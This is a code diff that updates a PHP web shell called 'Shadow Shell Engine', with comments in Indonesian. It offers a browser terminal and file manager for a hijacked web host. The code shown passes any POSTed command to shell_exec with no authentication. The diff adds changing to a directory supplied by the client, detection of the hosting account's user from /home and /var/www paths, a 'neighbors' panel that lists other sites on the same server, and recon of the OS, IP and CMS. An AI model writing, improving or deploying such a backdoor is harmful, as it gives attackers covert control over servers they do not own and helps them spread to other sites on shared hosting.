@@ -68,20 +68,30 @@ function get_cms($p) {
 // --- SYSTEM STATS COLLECTOR ---
 function get_system_stats($p) {
     $s = ['linux' => php_uname('s')." ".php_uname('r'), 'server' => $_SERVER['SERVER_SOFTWARE']];
-    $exec_user = @exec('whoami');
 
-    // 2. Deteksi Owner Script (User di /home/{user})
+    // Ambil user proses asli
+    $exec_user = @exec('whoami') ?: 'webserver';
+
+    // Logika penentuan context user berdasarkan path
+    // Memecah path untuk mengambil nama folder setelah /home atau /var/www
+    $parts = explode('/', trim($p, '/'));
+    if (isset($parts[0]) && $parts[0] == 'home' && isset($parts[1])) {
+        $s['current_user'] = $parts[1];
+    } elseif (isset($parts[0]) && $parts[0] == 'var' && isset($parts[1]) && $parts[1] == 'www' && isset($parts[2])) {
+        // Jika di /var/www/html, user biasanya 'html' atau 'www-data'
+        $s['current_user'] = $parts[2];
+    } else {
+        $s['current_user'] = $exec_user;
+    }
+
     $uid = getmyuid();
-    $owner_info = posix_getpwuid($uid);
-    $owner_user = $owner_info['name'] ?? 'unknown';
+    $owner_info = function_exists('posix_getpwuid') ? posix_getpwuid($uid) : ['name' => 'root'];
+    $s['user_info'] = $s['current_user'] . " (Owner: " . ($owner_info['name'] ?? 'root') . ")";
 
-    // Gabungkan agar informatif
-    $s['user_info'] = "$exec_user (Owner: $owner_user)";
-    // Mendapatkan IP Server (Public)
+    // Info tambahan
     $s['ip'] = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
-
-    // Mendapatkan CMS/Tech
     $s['cms'] = get_cms($p);
+
     // SSD Logic: Try Shell first (Accurate), Fallback to PHP Internal
     $df_out = @shell_exec("df -P ".escapeshellarg($p)." | tail -1");
     $df = $df_out ? preg_split('/\s+/', trim($df_out)) : [];
@@ -136,6 +146,9 @@ $sys = get_system_stats($path);
 
 // --- AJAX COMMAND HANDLER ---
 if (isset($_POST['cmd'])) {
+    // Berpindah direktori ke path yang dikirim sebelum eksekusi perintah
+    $target_dir = isset($_POST['path']) ? $_POST['path'] : dirname(__FILE__);
+    chdir($target_dir);
     echo htmlspecialchars(shell_exec($_POST['cmd'] . " 2>&1"));
     exit;
 }
@@ -206,49 +219,12 @@ a { text-decoration: none; color: #0f0; }
     box-sizing: border-box;
 }
 
-#term-box {
-margin: 20px 0;
-border: 1px solid #0f0;
-background: #050505;
-width: 100%;
-box-sizing: border-box;
-}
+#term-box { margin: 20px 0; border: 1px solid #0f0; background: #050505; width: 100%; box-sizing: border-box; }
+.term-split { display: flex; height: 320px; border-bottom: 1px solid #0f0; width: 100%; }
 
-.term-split {
-    display: flex;
-    height: 300px;
-    border-bottom: 1px solid #0f0;
-    width: 100%;
-}
-
-/* Pembagian 25% | 50% | 25% agar tidak tumpah */
-.term-tools {
-    width: 25%;
-    padding: 15px;
-    border-right: 1px solid #0f0;
-    overflow-y: auto;
-    box-sizing: border-box;
-}
-
-#term-out {
-width: 50%;
-padding: 15px;
-color: #0f0;
-font-size: 12px;
-white-space: pre-wrap;
-overflow-y: scroll;
-box-sizing: border-box;
-}
-
-.term-stats {
-    width: 25%;
-    color: #0f0;
-    padding: 15px;
-    background: #080808;
-    border-left: 1px solid #0f0;
-    line-height: 1.6;
-    box-sizing: border-box;
-}
+.term-tools { width: 25%; padding: 15px; border-right: 1px solid #0f0; overflow-y: auto; box-sizing: border-box; }
+#term-out { width: 50%; padding: 15px; color: #0f0; font-size: 12px; white-space: pre-wrap; overflow-y: scroll; box-sizing: border-box; }
+.term-stats { width: 25%; padding: 15px; background: #080808; border-left: 1px solid #0f0; box-sizing: border-box; line-height: 1.6; }
 
 .term-tools h4, .term-stats h4 {
     margin: 0 0 10px 0;
@@ -319,6 +295,12 @@ tr:hover { background: #0a0a0a; outline: 1px solid #0f0; }
 <div class="term-split">
 <div id="term-out">Shadow Shell Engine v2.9...</div>
 <div class="term-tools">
+<div style="border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:10px;">
+<a href="javascript:void(0)" onclick="loadTool('neighbors')" style="font-size:10px; color:#0f0;">[ NEIGHBORS ]</a>
+<a href="javascript:void(0)" onclick="loadTool('info')" style="font-size:10px; color:#888; margin-left:10px;">[ HELP ]</a>
+</div>
+
+<div id="tools-content">
 <h4>[ TOOLS / NEIGHBORS ]</h4>
 <div style="margin-top:5px;">
 <?php
@@ -340,7 +322,7 @@ foreach ($neighbors as $n):
 </div>
 <?php endforeach; ?>
 </div>
-</div>
+</div> </div>
 <div class="term-stats">
 <h4>[ SYSTEM INFO ]</h4><br><br>
 <b>OS   :</b> <span style="color:#888;"><?= $sys['linux'] ?></span><br>
@@ -354,7 +336,9 @@ foreach ($neighbors as $n):
 </div>
 
 <div class="term-in-row">
-<span style="color:#888; margin-right:10px; font-weight:bold;">shell@shadow:~$</span>
+<span style="color:#0f0; margin-right:10px; font-weight:bold;">
+shell@<?= $sys['current_user'] ?>:~$
+</span>
 <input type="text" id="cmd-in" autofocus onkeydown="runCmd(event)">
 </div>
 </div>
@@ -413,7 +397,28 @@ $perms = substr(sprintf('%o', fileperms($f_p)), -4);
 <?php endif; ?>
 </div>
 <script>
-// Fungsi untuk mengambil daftar file terbaru tanpa reload
+function loadTool(toolName) {
+    const container = document.getElementById('tools-content');
+
+    if (toolName === 'neighbors') {
+        // Reload konten asli (Neighbors) via AJAX
+        refreshFileList();
+    }
+    else if (toolName === 'info') {
+        container.innerHTML = `
+        <h4>[ COMMAND HELP ]</h4>
+        <div style="color:#aaa; font-size:10px; line-height:1.5;">
+        <b style="color:#0f0;">mkdir [name]</b> - Create dir<br>
+        <b style="color:#0f0;">rm -rf [name]</b> - Delete<br>
+        <b style="color:#0f0;">unzip [file]</b> - Extract zip<br>
+        <b style="color:#0f0;">clear</b> - Clear terminal<br><br>
+        <i style="color:#666;">More tools coming soon...</i>
+        </div>
+        `;
+    }
+}
+
+// Update fungsi refreshFileList agar mendukung penarikan ulang konten Neighbors
 function refreshFileList() {
     const currentPath = new URLSearchParams(window.location.search).get('path') || '';
     fetch('?path=' + encodeURIComponent(currentPath))
@@ -422,13 +427,16 @@ function refreshFileList() {
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, 'text/html');
 
-        // 1. Refresh Tabel
-        const newTable = doc.querySelector('table');
-        if (newTable) document.querySelector('table').innerHTML = newTable.innerHTML;
+        if (doc.querySelector('table')) document.querySelector('table').innerHTML = doc.querySelector('table').innerHTML;
+        if (doc.querySelector('.term-stats')) document.querySelector('.term-stats').innerHTML = doc.querySelector('.term-stats').innerHTML;
+        if (doc.querySelector('.term-tools')) document.querySelector('.term-tools').innerHTML = doc.querySelector('.term-tools').innerHTML;
 
-        // 2. Refresh System Stats (SSD/RAM) agar sinkron setelah mkdir/unzip
-        const newStats = doc.querySelector('.term-stats');
-        if (newStats) document.querySelector('.term-stats').innerHTML = newStats.innerHTML;
+        // --- UPDATE PROMPT TERMINAL ---
+        const newPrompt = doc.querySelector('.term-in-row span');
+        if (newPrompt) document.querySelector('.term-in-row span').innerHTML = newPrompt.innerHTML;
+
+        // Update URL di browser agar tetap sinkron
+        window.history.pushState(null, '', '?path=' + encodeURIComponent(currentPath));
     });
 }
 
@@ -438,26 +446,26 @@ function runCmd(e) {
         const cmdInput = document.getElementById('cmd-in');
         const cmd = cmdInput.value;
         const out = document.getElementById('term-out');
+        // Ambil path saat ini dari URL
+        const currentPath = new URLSearchParams(window.location.search).get('path') || '<?= addslashes($path) ?>';
 
-        // Logika Clear Terminal
         if (cmd.toLowerCase() === 'clear') {
             out.innerHTML = 'Terminal Cleared.';
             cmdInput.value = '';
             return;
         }
 
+        // Kirim perintah DAN path ke PHP
         fetch('', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'cmd=' + encodeURIComponent(cmd)
+            body: 'cmd=' + encodeURIComponent(cmd) + '&path=' + encodeURIComponent(currentPath)
         })
         .then(r => r.text())
         .then(d => {
             out.innerHTML += "\n<span style='color:#fff;'>$ " + cmd + "</span>\n" + d;
             out.scrollTop = out.scrollHeight;
             cmdInput.value = '';
-
-        // Trigger refresh daftar file secara realtime
         refreshFileList();
         });
     }
